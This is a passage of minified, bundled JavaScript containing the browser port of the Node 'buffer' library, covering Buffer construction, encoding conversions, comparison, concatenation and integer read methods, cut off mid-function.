    if ("number" == typeof value) throw new TypeError('The "value" argument must not be of type number. Received type number');
    const valueOf = value.valueOf && value.valueOf();
    if (null != valueOf && valueOf !== value) return $88f34ecd95880360$var$Buffer.from(valueOf, encodingOrOffset, length);
    const b = function(obj) {
      if ($88f34ecd95880360$var$Buffer.isBuffer(obj)) {
        const len = 0 | $88f34ecd95880360$var$checked(obj.length), buf = $88f34ecd95880360$var$createBuffer(len);
        return 0 === buf.length || obj.copy(buf, 0, 0, len), buf;
      }
      if (void 0 !== obj.length) return "number" != typeof obj.length || $88f34ecd95880360$var$numberIsNaN(obj.length) ? $88f34ecd95880360$var$createBuffer(0) : $88f34ecd95880360$var$fromArrayLike(obj);
      if ("Buffer" === obj.type && Array.isArray(obj.data)) return $88f34ecd95880360$var$fromArrayLike(obj.data);
    }(value);
    if (b) return b;
    if ("undefined" != typeof Symbol && null != Symbol.toPrimitive && "function" == typeof value[Symbol.toPrimitive]) return $88f34ecd95880360$var$Buffer.from(value[Symbol.toPrimitive]("string"), encodingOrOffset, length);
    throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof value);
  }
  function $88f34ecd95880360$var$assertSize(size) {
    if ("number" != typeof size) throw new TypeError('"size" argument must be of type number');
    if (size < 0) throw new RangeError('The value "' + size + '" is invalid for option "size"');
  }
  function $88f34ecd95880360$var$allocUnsafe(size) {
    return $88f34ecd95880360$var$assertSize(size), $88f34ecd95880360$var$createBuffer(size < 0 ? 0 : 0 | $88f34ecd95880360$var$checked(size));
  }
  function $88f34ecd95880360$var$fromArrayLike(array) {
    const length = array.length < 0 ? 0 : 0 | $88f34ecd95880360$var$checked(array.length), buf = $88f34ecd95880360$var$createBuffer(length);
    for (let i = 0; i < length; i += 1) buf[i] = 255 & array[i];
    return buf;
  }
  function $88f34ecd95880360$var$fromArrayBuffer(array, byteOffset, length) {
    if (byteOffset < 0 || array.byteLength < byteOffset) throw new RangeError('"offset" is outside of buffer bounds');
    if (array.byteLength < byteOffset + (length || 0)) throw new RangeError('"length" is outside of buffer bounds');
    let buf;
    return buf = void 0 === byteOffset && void 0 === length ? new Uint8Array(array) : void 0 === length ? new Uint8Array(array, byteOffset) : new Uint8Array(array, byteOffset, length), 
    Object.setPrototypeOf(buf, $88f34ecd95880360$var$Buffer.prototype), buf;
  }
  function $88f34ecd95880360$var$checked(length) {
    if (length >= $88f34ecd95880360$var$K_MAX_LENGTH) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + $88f34ecd95880360$var$K_MAX_LENGTH.toString(16) + " bytes");
    return 0 | length;
  }
  function $88f34ecd95880360$var$byteLength(string, encoding) {
    if ($88f34ecd95880360$var$Buffer.isBuffer(string)) return string.length;
    if (ArrayBuffer.isView(string) || $88f34ecd95880360$var$isInstance(string, ArrayBuffer)) return string.byteLength;
    if ("string" != typeof string) throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof string);
    const len = string.length, mustMatch = arguments.length > 2 && !0 === arguments[2];
    if (!mustMatch && 0 === len) return 0;
    let loweredCase = !1;
    for (;;) switch (encoding) {
     case "ascii":
     case "latin1":
     case "binary":
      return len;

     case "utf8":
     case "utf-8":
      return $88f34ecd95880360$var$utf8ToBytes(string).length;

     case "ucs2":
     case "ucs-2":
     case "utf16le":
     case "utf-16le":
      return 2 * len;

     case "hex":
      return len >>> 1;

     case "base64":
      return $88f34ecd95880360$var$base64ToBytes(string).length;

     default:
      if (loweredCase) return mustMatch ? -1 : $88f34ecd95880360$var$utf8ToBytes(string).length;
      encoding = ("" + encoding).toLowerCase(), loweredCase = !0;
    }
  }
  function $88f34ecd95880360$var$slowToString(encoding, start, end) {
    let loweredCase = !1;
    if ((void 0 === start || start < 0) && (start = 0), start > this.length) return "";
    if ((void 0 === end || end > this.length) && (end = this.length), end <= 0) return "";
    if ((end >>>= 0) <= (start >>>= 0)) return "";
    for (encoding || (encoding = "utf8"); ;) switch (encoding) {
     case "hex":
      return $88f34ecd95880360$var$hexSlice(this, start, end);

     case "utf8":
     case "utf-8":
      return $88f34ecd95880360$var$utf8Slice(this, start, end);

     case "ascii":
      return $88f34ecd95880360$var$asciiSlice(this, start, end);

     case "latin1":
     case "binary":
      return $88f34ecd95880360$var$latin1Slice(this, start, end);

     case "base64":
      return $88f34ecd95880360$var$base64Slice(this, start, end);

     case "ucs2":
     case "ucs-2":
     case "utf16le":
     case "utf-16le":
      return $88f34ecd95880360$var$utf16leSlice(this, start, end);

     default:
      if (loweredCase) throw new TypeError("Unknown encoding: " + encoding);
      encoding = (encoding + "").toLowerCase(), loweredCase = !0;
    }
  }
  function $88f34ecd95880360$var$swap(b, n, m) {
    const i = b[n];
    b[n] = b[m], b[m] = i;
  }
  function $88f34ecd95880360$var$bidirectionalIndexOf(buffer, val, byteOffset, encoding, dir) {
    if (0 === buffer.length) return -1;
    if ("string" == typeof byteOffset ? (encoding = byteOffset, byteOffset = 0) : byteOffset > 2147483647 ? byteOffset = 2147483647 : byteOffset < -2147483648 && (byteOffset = -2147483648), 
    $88f34ecd95880360$var$numberIsNaN(byteOffset = +byteOffset) && (byteOffset = dir ? 0 : buffer.length - 1), 
    byteOffset < 0 && (byteOffset = buffer.length + byteOffset), byteOffset >= buffer.length) {
      if (dir) return -1;
      byteOffset = buffer.length - 1;
    } else if (byteOffset < 0) {
      if (!dir) return -1;
      byteOffset = 0;
    }
    if ("string" == typeof val && (val = $88f34ecd95880360$var$Buffer.from(val, encoding)), 
    $88f34ecd95880360$var$Buffer.isBuffer(val)) return 0 === val.length ? -1 : $88f34ecd95880360$var$arrayIndexOf(buffer, val, byteOffset, encoding, dir);
    if ("number" == typeof val) return val &= 255, "function" == typeof Uint8Array.prototype.indexOf ? dir ? Uint8Array.prototype.indexOf.call(buffer, val, byteOffset) : Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset) : $88f34ecd95880360$var$arrayIndexOf(buffer, [ val ], byteOffset, encoding, dir);
    throw new TypeError("val must be string, number or Buffer");
  }
  function $88f34ecd95880360$var$arrayIndexOf(arr, val, byteOffset, encoding, dir) {
    let i1, indexSize = 1, arrLength = arr.length, valLength = val.length;
    if (void 0 !== encoding && ("ucs2" === (encoding = String(encoding).toLowerCase()) || "ucs-2" === encoding || "utf16le" === encoding || "utf-16le" === encoding)) {
      if (arr.length < 2 || val.length < 2) return -1;
      indexSize = 2, arrLength /= 2, valLength /= 2, byteOffset /= 2;
    }
    function read(buf, i) {
      return 1 === indexSize ? buf[i] : buf.readUInt16BE(i * indexSize);
    }
    if (dir) {
      let foundIndex = -1;
      for (i1 = byteOffset; i1 < arrLength; i1++) if (read(arr, i1) === read(val, -1 === foundIndex ? 0 : i1 - foundIndex)) {
        if (-1 === foundIndex && (foundIndex = i1), i1 - foundIndex + 1 === valLength) return foundIndex * indexSize;
      } else -1 !== foundIndex && (i1 -= i1 - foundIndex), foundIndex = -1;
    } else for (byteOffset + valLength > arrLength && (byteOffset = arrLength - valLength), 
    i1 = byteOffset; i1 >= 0; i1--) {
      let found = !0;
      for (let j = 0; j < valLength; j++) if (read(arr, i1 + j) !== read(val, j)) {
        found = !1;
        break;
      }
      if (found) return i1;
    }
    return -1;
  }
  function $88f34ecd95880360$var$hexWrite(buf, string, offset, length) {
    offset = Number(offset) || 0;
    const remaining = buf.length - offset;
    length ? (length = Number(length)) > remaining && (length = remaining) : length = remaining;
    const strLen = string.length;
    let i;
    for (length > strLen / 2 && (length = strLen / 2), i = 0; i < length; ++i) {
      const parsed = parseInt(string.substr(2 * i, 2), 16);
      if ($88f34ecd95880360$var$numberIsNaN(parsed)) return i;
      buf[offset + i] = parsed;
    }
    return i;
  }
  function $88f34ecd95880360$var$utf8Write(buf, string, offset, length) {
    return $88f34ecd95880360$var$blitBuffer($88f34ecd95880360$var$utf8ToBytes(string, buf.length - offset), buf, offset, length);
  }
  function $88f34ecd95880360$var$asciiWrite(buf, string, offset, length) {
    return $88f34ecd95880360$var$blitBuffer(function(str) {
      const byteArray = [];
      for (let i = 0; i < str.length; ++i) byteArray.push(255 & str.charCodeAt(i));
      return byteArray;
    }(string), buf, offset, length);
  }
  function $88f34ecd95880360$var$base64Write(buf, string, offset, length) {
    return $88f34ecd95880360$var$blitBuffer($88f34ecd95880360$var$base64ToBytes(string), buf, offset, length);
  }
  function $88f34ecd95880360$var$ucs2Write(buf, string, offset, length) {
    return $88f34ecd95880360$var$blitBuffer(function(str, units) {
      let c, hi, lo;
      const byteArray = [];
      for (let i = 0; i < str.length && !((units -= 2) < 0); ++i) c = str.charCodeAt(i), 
      hi = c >> 8, lo = c % 256, byteArray.push(lo), byteArray.push(hi);
      return byteArray;
    }(string, buf.length - offset), buf, offset, length);
  }
  function $88f34ecd95880360$var$base64Slice(buf, start, end) {
    return 0 === start && end === buf.length ? $604506cec089c996$export$6100ba28696e12de(buf) : $604506cec089c996$export$6100ba28696e12de(buf.slice(start, end));
  }
  function $88f34ecd95880360$var$utf8Slice(buf, start, end) {
    end = Math.min(buf.length, end);
    const res = [];
    let i = start;
    for (;i < end; ) {
      const firstByte = buf[i];
      let codePoint = null, bytesPerSequence = firstByte > 239 ? 4 : firstByte > 223 ? 3 : firstByte > 191 ? 2 : 1;
      if (i + bytesPerSequence <= end) {
        let secondByte, thirdByte, fourthByte, tempCodePoint;
        switch (bytesPerSequence) {
         case 1:
          firstByte < 128 && (codePoint = firstByte);
          break;

         case 2:
          secondByte = buf[i + 1], 128 == (192 & secondByte) && (tempCodePoint = (31 & firstByte) << 6 | 63 & secondByte, 
          tempCodePoint > 127 && (codePoint = tempCodePoint));
          break;

         case 3:
          secondByte = buf[i + 1], thirdByte = buf[i + 2], 128 == (192 & secondByte) && 128 == (192 & thirdByte) && (tempCodePoint = (15 & firstByte) << 12 | (63 & secondByte) << 6 | 63 & thirdByte, 
          tempCodePoint > 2047 && (tempCodePoint < 55296 || tempCodePoint > 57343) && (codePoint = tempCodePoint));
          break;

         case 4:
          secondByte = buf[i + 1], thirdByte = buf[i + 2], fourthByte = buf[i + 3], 128 == (192 & secondByte) && 128 == (192 & thirdByte) && 128 == (192 & fourthByte) && (tempCodePoint = (15 & firstByte) << 18 | (63 & secondByte) << 12 | (63 & thirdByte) << 6 | 63 & fourthByte, 
          tempCodePoint > 65535 && tempCodePoint < 1114112 && (codePoint = tempCodePoint));
        }
      }
      null === codePoint ? (codePoint = 65533, bytesPerSequence = 1) : codePoint > 65535 && (codePoint -= 65536, 
      res.push(codePoint >>> 10 & 1023 | 55296), codePoint = 56320 | 1023 & codePoint), 
      res.push(codePoint), i += bytesPerSequence;
    }
    return function(codePoints) {
      const len = codePoints.length;
      if (len <= $88f34ecd95880360$var$MAX_ARGUMENTS_LENGTH) return String.fromCharCode.apply(String, codePoints);
      let res = "", i = 0;
      for (;i < len; ) res += String.fromCharCode.apply(String, codePoints.slice(i, i += $88f34ecd95880360$var$MAX_ARGUMENTS_LENGTH));
      return res;
    }(res);
  }
  $88f34ecd95880360$var$Buffer.TYPED_ARRAY_SUPPORT = function() {
    try {
      const arr = new Uint8Array(1), proto = {
        foo: function() {
          return 42;
        }
      };
      return Object.setPrototypeOf(proto, Uint8Array.prototype), Object.setPrototypeOf(arr, proto), 
      42 === arr.foo();
    } catch (e) {
      return !1;
    }
  }(), $88f34ecd95880360$var$Buffer.TYPED_ARRAY_SUPPORT || "undefined" == typeof console || "function" != typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."), 
  Object.defineProperty($88f34ecd95880360$var$Buffer.prototype, "parent", {
    enumerable: !0,
    get: function() {
      if ($88f34ecd95880360$var$Buffer.isBuffer(this)) return this.buffer;
    }
  }), Object.defineProperty($88f34ecd95880360$var$Buffer.prototype, "offset", {
    enumerable: !0,
    get: function() {
      if ($88f34ecd95880360$var$Buffer.isBuffer(this)) return this.byteOffset;
    }
  }), $88f34ecd95880360$var$Buffer.poolSize = 8192, $88f34ecd95880360$var$Buffer.from = function(value, encodingOrOffset, length) {
    return $88f34ecd95880360$var$from(value, encodingOrOffset, length);
  }, Object.setPrototypeOf($88f34ecd95880360$var$Buffer.prototype, Uint8Array.prototype), 
  Object.setPrototypeOf($88f34ecd95880360$var$Buffer, Uint8Array), $88f34ecd95880360$var$Buffer.alloc = function(size, fill, encoding) {
    return function(size, fill, encoding) {
      return $88f34ecd95880360$var$assertSize(size), size <= 0 ? $88f34ecd95880360$var$createBuffer(size) : void 0 !== fill ? "string" == typeof encoding ? $88f34ecd95880360$var$createBuffer(size).fill(fill, encoding) : $88f34ecd95880360$var$createBuffer(size).fill(fill) : $88f34ecd95880360$var$createBuffer(size);
    }(size, fill, encoding);
  }, $88f34ecd95880360$var$Buffer.allocUnsafe = function(size) {
    return $88f34ecd95880360$var$allocUnsafe(size);
  }, $88f34ecd95880360$var$Buffer.allocUnsafeSlow = function(size) {
    return $88f34ecd95880360$var$allocUnsafe(size);
  }, $88f34ecd95880360$var$Buffer.isBuffer = function(b) {
    return null != b && !0 === b._isBuffer && b !== $88f34ecd95880360$var$Buffer.prototype;
  }, $88f34ecd95880360$var$Buffer.compare = function(a, b) {
    if ($88f34ecd95880360$var$isInstance(a, Uint8Array) && (a = $88f34ecd95880360$var$Buffer.from(a, a.offset, a.byteLength)), 
    $88f34ecd95880360$var$isInstance(b, Uint8Array) && (b = $88f34ecd95880360$var$Buffer.from(b, b.offset, b.byteLength)), 
    !$88f34ecd95880360$var$Buffer.isBuffer(a) || !$88f34ecd95880360$var$Buffer.isBuffer(b)) throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
    if (a === b) return 0;
    let x = a.length, y = b.length;
    for (let i = 0, len = Math.min(x, y); i < len; ++i) if (a[i] !== b[i]) {
      x = a[i], y = b[i];
      break;
    }
    return x < y ? -1 : y < x ? 1 : 0;
  }, $88f34ecd95880360$var$Buffer.isEncoding = function(encoding) {
    switch (String(encoding).toLowerCase()) {
     case "hex":
     case "utf8":
     case "utf-8":
     case "ascii":
     case "latin1":
     case "binary":
     case "base64":
     case "ucs2":
     case "ucs-2":
     case "utf16le":
     case "utf-16le":
      return !0;

     default:
      return !1;
    }
  }, $88f34ecd95880360$var$Buffer.concat = function(list, length) {
    if (!Array.isArray(list)) throw new TypeError('"list" argument must be an Array of Buffers');
    if (0 === list.length) return $88f34ecd95880360$var$Buffer.alloc(0);
    let i;
    if (void 0 === length) for (length = 0, i = 0; i < list.length; ++i) length += list[i].length;
    const buffer = $88f34ecd95880360$var$Buffer.allocUnsafe(length);
    let pos = 0;
    for (i = 0; i < list.length; ++i) {
      let buf = list[i];
      if ($88f34ecd95880360$var$isInstance(buf, Uint8Array)) pos + buf.length > buffer.length ? ($88f34ecd95880360$var$Buffer.isBuffer(buf) || (buf = $88f34ecd95880360$var$Buffer.from(buf)), 
      buf.copy(buffer, pos)) : Uint8Array.prototype.set.call(buffer, buf, pos); else {
        if (!$88f34ecd95880360$var$Buffer.isBuffer(buf)) throw new TypeError('"list" argument must be an Array of Buffers');
        buf.copy(buffer, pos);
      }
      pos += buf.length;
    }
    return buffer;
  }, $88f34ecd95880360$var$Buffer.byteLength = $88f34ecd95880360$var$byteLength, $88f34ecd95880360$var$Buffer.prototype._isBuffer = !0, 
  $88f34ecd95880360$var$Buffer.prototype.swap16 = function() {
    const len = this.length;
    if (len % 2 != 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
    for (let i = 0; i < len; i += 2) $88f34ecd95880360$var$swap(this, i, i + 1);
    return this;
  }, $88f34ecd95880360$var$Buffer.prototype.swap32 = function() {
    const len = this.length;
    if (len % 4 != 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
    for (let i = 0; i < len; i += 4) $88f34ecd95880360$var$swap(this, i, i + 3), $88f34ecd95880360$var$swap(this, i + 1, i + 2);
    return this;
  }, $88f34ecd95880360$var$Buffer.prototype.swap64 = function() {
    const len = this.length;
    if (len % 8 != 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
    for (let i = 0; i < len; i += 8) $88f34ecd95880360$var$swap(this, i, i + 7), $88f34ecd95880360$var$swap(this, i + 1, i + 6), 
    $88f34ecd95880360$var$swap(this, i + 2, i + 5), $88f34ecd95880360$var$swap(this, i + 3, i + 4);
    return this;
  }, $88f34ecd95880360$var$Buffer.prototype.toString = function() {
    const length = this.length;
    return 0 === length ? "" : 0 === arguments.length ? $88f34ecd95880360$var$utf8Slice(this, 0, length) : $88f34ecd95880360$var$slowToString.apply(this, arguments);
  }, $88f34ecd95880360$var$Buffer.prototype.toLocaleString = $88f34ecd95880360$var$Buffer.prototype.toString, 
  $88f34ecd95880360$var$Buffer.prototype.equals = function(b) {
    if (!$88f34ecd95880360$var$Buffer.isBuffer(b)) throw new TypeError("Argument must be a Buffer");
    return this === b || 0 === $88f34ecd95880360$var$Buffer.compare(this, b);
  }, $88f34ecd95880360$var$Buffer.prototype.inspect = function() {
    let str = "";
    return str = this.toString("hex", 0, 50).replace(/(.{2})/g, "$1 ").trim(), this.length > 50 && (str += " ... "), 
    "<Buffer " + str + ">";
  }, $88f34ecd95880360$var$customInspectSymbol && ($88f34ecd95880360$var$Buffer.prototype[$88f34ecd95880360$var$customInspectSymbol] = $88f34ecd95880360$var$Buffer.prototype.inspect), 
  $88f34ecd95880360$var$Buffer.prototype.compare = function(target, start, end, thisStart, thisEnd) {
    if ($88f34ecd95880360$var$isInstance(target, Uint8Array) && (target = $88f34ecd95880360$var$Buffer.from(target, target.offset, target.byteLength)), 
    !$88f34ecd95880360$var$Buffer.isBuffer(target)) throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof target);
    if (void 0 === start && (start = 0), void 0 === end && (end = target ? target.length : 0), 
    void 0 === thisStart && (thisStart = 0), void 0 === thisEnd && (thisEnd = this.length), 
    start < 0 || end > target.length || thisStart < 0 || thisEnd > this.length) throw new RangeError("out of range index");
    if (thisStart >= thisEnd && start >= end) return 0;
    if (thisStart >= thisEnd) return -1;
    if (start >= end) return 1;
    if (this === target) return 0;
    let x = (thisEnd >>>= 0) - (thisStart >>>= 0), y = (end >>>= 0) - (start >>>= 0);
    const len = Math.min(x, y), thisCopy = this.slice(thisStart, thisEnd), targetCopy = target.slice(start, end);
    for (let i = 0; i < len; ++i) if (thisCopy[i] !== targetCopy[i]) {
      x = thisCopy[i], y = targetCopy[i];
      break;
    }
    return x < y ? -1 : y < x ? 1 : 0;
  }, $88f34ecd95880360$var$Buffer.prototype.includes = function(val, byteOffset, encoding) {
    return -1 !== this.indexOf(val, byteOffset, encoding);
  }, $88f34ecd95880360$var$Buffer.prototype.indexOf = function(val, byteOffset, encoding) {
    return $88f34ecd95880360$var$bidirectionalIndexOf(this, val, byteOffset, encoding, !0);
  }, $88f34ecd95880360$var$Buffer.prototype.lastIndexOf = function(val, byteOffset, encoding) {
    return $88f34ecd95880360$var$bidirectionalIndexOf(this, val, byteOffset, encoding, !1);
  }, $88f34ecd95880360$var$Buffer.prototype.write = function(string, offset, length, encoding) {
    if (void 0 === offset) encoding = "utf8", length = this.length, offset = 0; else if (void 0 === length && "string" == typeof offset) encoding = offset, 
    length = this.length, offset = 0; else {
      if (!isFinite(offset)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
      offset >>>= 0, isFinite(length) ? (length >>>= 0, void 0 === encoding && (encoding = "utf8")) : (encoding = length, 
      length = void 0);
    }
    const remaining = this.length - offset;
    if ((void 0 === length || length > remaining) && (length = remaining), string.length > 0 && (length < 0 || offset < 0) || offset > this.length) throw new RangeError("Attempt to write outside buffer bounds");
    encoding || (encoding = "utf8");
    let loweredCase = !1;
    for (;;) switch (encoding) {
     case "hex":
      return $88f34ecd95880360$var$hexWrite(this, string, offset, length);

     case "utf8":
     case "utf-8":
      return $88f34ecd95880360$var$utf8Write(this, string, offset, length);

     case "ascii":
     case "latin1":
     case "binary":
      return $88f34ecd95880360$var$asciiWrite(this, string, offset, length);

     case "base64":
      return $88f34ecd95880360$var$base64Write(this, string, offset, length);

     case "ucs2":
     case "ucs-2":
     case "utf16le":
     case "utf-16le":
      return $88f34ecd95880360$var$ucs2Write(this, string, offset, length);

     default:
      if (loweredCase) throw new TypeError("Unknown encoding: " + encoding);
      encoding = ("" + encoding).toLowerCase(), loweredCase = !0;
    }
  }, $88f34ecd95880360$var$Buffer.prototype.toJSON = function() {
    return {
      type: "Buffer",
      data: Array.prototype.slice.call(this._arr || this, 0)
    };
  };
  const $88f34ecd95880360$var$MAX_ARGUMENTS_LENGTH = 4096;
  function $88f34ecd95880360$var$asciiSlice(buf, start, end) {
    let ret = "";
    end = Math.min(buf.length, end);
    for (let i = start; i < end; ++i) ret += String.fromCharCode(127 & buf[i]);
    return ret;
  }
  function $88f34ecd95880360$var$latin1Slice(buf, start, end) {
    let ret = "";
    end = Math.min(buf.length, end);
    for (let i = start; i < end; ++i) ret += String.fromCharCode(buf[i]);
    return ret;
  }
  function $88f34ecd95880360$var$hexSlice(buf, start, end) {
    const len = buf.length;
    (!start || start < 0) && (start = 0), (!end || end < 0 || end > len) && (end = len);
    let out = "";
    for (let i = start; i < end; ++i) out += $88f34ecd95880360$var$hexSliceLookupTable[buf[i]];
    return out;
  }
  function $88f34ecd95880360$var$utf16leSlice(buf, start, end) {
    const bytes = buf.slice(start, end);
    let res = "";
    for (let i = 0; i < bytes.length - 1; i += 2) res += String.fromCharCode(bytes[i] + 256 * bytes[i + 1]);
    return res;
  }
  function $88f34ecd95880360$var$checkOffset(offset, ext, length) {
    if (offset % 1 != 0 || offset < 0) throw new RangeError("offset is not uint");
    if (offset + ext > length) throw new RangeError("Trying to access beyond buffer length");
  }
  function $88f34ecd95880360$var$checkInt(buf, value, offset, ext, max, min) {
    if (!$88f34ecd95880360$var$Buffer.isBuffer(buf)) throw new TypeError('"buffer" argument must be a Buffer instance');
    if (value > max || value < min) throw new RangeError('"value" argument is out of bounds');
    if (offset + ext > buf.length) throw new RangeError("Index out of range");
  }
  function $88f34ecd95880360$var$wrtBigUInt64LE(buf, value, offset, min, max) {
    $88f34ecd95880360$var$checkIntBI(value, min, max, buf, offset, 7);
    let lo = Number(value & BigInt(4294967295));
    buf[offset++] = lo, lo >>= 8, buf[offset++] = lo, lo >>= 8, buf[offset++] = lo, 
    lo >>= 8, buf[offset++] = lo;
    let hi = Number(value >> BigInt(32) & BigInt(4294967295));
    return buf[offset++] = hi, hi >>= 8, buf[offset++] = hi, hi >>= 8, buf[offset++] = hi, 
    hi >>= 8, buf[offset++] = hi, offset;
  }
  function $88f34ecd95880360$var$wrtBigUInt64BE(buf, value, offset, min, max) {
    $88f34ecd95880360$var$checkIntBI(value, min, max, buf, offset, 7);
    let lo = Number(value & BigInt(4294967295));
    buf[offset + 7] = lo, lo >>= 8, buf[offset + 6] = lo, lo >>= 8, buf[offset + 5] = lo, 
    lo >>= 8, buf[offset + 4] = lo;
    let hi = Number(value >> BigInt(32) & BigInt(4294967295));
    return buf[offset + 3] = hi, hi >>= 8, buf[offset + 2] = hi, hi >>= 8, buf[offset + 1] = hi, 
    hi >>= 8, buf[offset] = hi, offset + 8;
  }
  function $88f34ecd95880360$var$checkIEEE754(buf, value, offset, ext, max, min) {
    if (offset + ext > buf.length) throw new RangeError("Index out of range");
    if (offset < 0) throw new RangeError("Index out of range");
  }
  function $88f34ecd95880360$var$writeFloat(buf, value, offset, littleEndian, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkIEEE754(buf, 0, offset, 4), 
    $4f5fe54a600adeca$export$68d8715fc104d294(buf, value, offset, littleEndian, 23, 4), 
    offset + 4;
  }
  function $88f34ecd95880360$var$writeDouble(buf, value, offset, littleEndian, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkIEEE754(buf, 0, offset, 8), 
    $4f5fe54a600adeca$export$68d8715fc104d294(buf, value, offset, littleEndian, 52, 8), 
    offset + 8;
  }
  $88f34ecd95880360$var$Buffer.prototype.slice = function(start, end) {
    const len = this.length;
    (start = ~~start) < 0 ? (start += len) < 0 && (start = 0) : start > len && (start = len), 
    (end = void 0 === end ? len : ~~end) < 0 ? (end += len) < 0 && (end = 0) : end > len && (end = len), 
    end < start && (end = start);
    const newBuf = this.subarray(start, end);
    return Object.setPrototypeOf(newBuf, $88f34ecd95880360$var$Buffer.prototype), newBuf;
  }, $88f34ecd95880360$var$Buffer.prototype.readUintLE = $88f34ecd95880360$var$Buffer.prototype.readUIntLE = function(offset, byteLength1, noAssert) {
    offset >>>= 0, byteLength1 >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, byteLength1, this.length);
    let val = this[offset], mul = 1, i = 0;
    for (;++i < byteLength1 && (mul *= 256); ) val += this[offset + i] * mul;
    return val;
  }, $88f34ecd95880360$var$Buffer.prototype.readUintBE = $88f34ecd95880360$var$Buffer.prototype.readUIntBE = function(offset, byteLength2, noAssert) {
    offset >>>= 0, byteLength2 >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, byteLength2, this.length);
    let val = this[offset + --byteLength2], mul = 1;
    for (;byteLength2 > 0 && (mul *= 256); ) val += this[offset + --byteLength2] * mul;
    return val;
  }, $88f34ecd95880360$var$Buffer.prototype.readUint8 = $88f34ecd95880360$var$Buffer.prototype.readUInt8 = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 1, this.length), 
    this[offset];
  }, $88f34ecd95880360$var$Buffer.prototype.readUint16LE = $88f34ecd95880360$var$Buffer.prototype.readUInt16LE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 2, this.length), 
    this[offset] | this[offset + 1] << 8;
  }, $88f34ecd95880360$var$Buffer.prototype.readUint16BE = $88f34ecd95880360$var$Buffer.prototype.readUInt16BE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 2, this.length), 
    this[offset] << 8 | this[offset + 1];
  }, $88f34ecd95880360$var$Buffer.prototype.readUint32LE = $88f34ecd95880360$var$Buffer.prototype.readUInt32LE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 4, this.length), 
    (this[offset] | this[offset + 1] << 8 | this[offset + 2] << 16) + 16777216 * this[offset + 3];
  }, $88f34ecd95880360$var$Buffer.prototype.readUint32BE = $88f34ecd95880360$var$Buffer.prototype.readUInt32BE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 4, this.length), 
    16777216 * this[offset] + (this[offset + 1] << 16 | this[offset + 2] << 8 | this[offset + 3]);
  }, $88f34ecd95880360$var$Buffer.prototype.readBigUInt64LE = $88f34ecd95880360$var$defineBigIntMethod((function(offset) {
    $88f34ecd95880360$var$validateNumber(offset >>>= 0, "offset");
    const first = this[offset], last = this[offset + 7];
    void 0 !== first && void 0 !== last || $88f34ecd95880360$var$boundsError(offset, this.length - 8);
    const lo = first + 256 * this[++offset] + 65536 * this[++offset] + this[++offset] * 2 ** 24, hi = this[++offset] + 256 * this[++offset] + 65536 * this[++offset] + last * 2 ** 24;
    return BigInt(lo) + (BigInt(hi) << BigInt(32));
  })), $88f34ecd95880360$var$Buffer.prototype.readBigUInt64BE = $88f34ecd95880360$var$defineBigIntMethod((function(offset) {
    $88f34ecd95880360$var$validateNumber(offset >>>= 0, "offset");
    const first = this[offset], last = this[offset + 7];
    void 0 !== first && void 0 !== last || $88f34ecd95880360$var$boundsError(offset, this.length - 8);
    const hi = first * 2 ** 24 + 65536 * this[++offset] + 256 * this[++offset] + this[++offset], lo = this[++offset] * 2 ** 24 + 65536 * this[++offset] + 256 * this[++offset] + last;
    return (BigInt(hi) << BigInt(32)) + BigInt(lo);
  })), $88f34ecd95880360$var$Buffer.prototype.readIntLE = function(offset, byteLength3, noAssert) {
    offset >>>= 0, byteLength3 >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, byteLength3, this.length);
    let val = this[offset], mul = 1, i = 0;
    for (;++i < byteLength3 && (mul *= 256); ) val += this[offset + i] * mul;
    return mul *= 128, val >= mul && (val -= Math.pow(2, 8 * byteLength3)), val;
  }, $88f34ecd95880360$var$Buffer.prototype.readIntBE = function(offset, byteLength4, noAssert) {
    offset >>>= 0, byteLength4 >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, byteLength4, this.length);
    let i = byteLength4, mul = 1, val = this[offset + --i];
    for (;i > 0 && (mul *= 256); ) val += this[offset + --i] * mul;
    return mul *= 128, val >= mul && (val -= Math.pow(2, 8 * byteLength4)), val;
  }, $88f34ecd95880360$var$Buffer.prototype.readInt8 = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 1, this.length), 
    128 & this[offset] ? -1 * (255 - this[offset] + 1) : this[offset];
  }, $88f34ecd95880360$var$Buffer.prototype.readInt16LE = function(offset, noAssert) {
    offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 2, this.length);
    const val = this[offset] | this[offset + 1] << 8;
    return 32768 & val ? 4294901760 | val : val;
  }, $88f34ecd95880360$var$Buffer.prototype.readInt16BE = function(offset, noAssert) {
    offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 2, this.length);
    const val = this[offset + 1] | this[offset] << 8;
    return 32768 & val ? 4294901760 | val : val;
  }, $88f34ecd95880360$var$Buffer.prototype.readInt32LE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 4, this.length), 
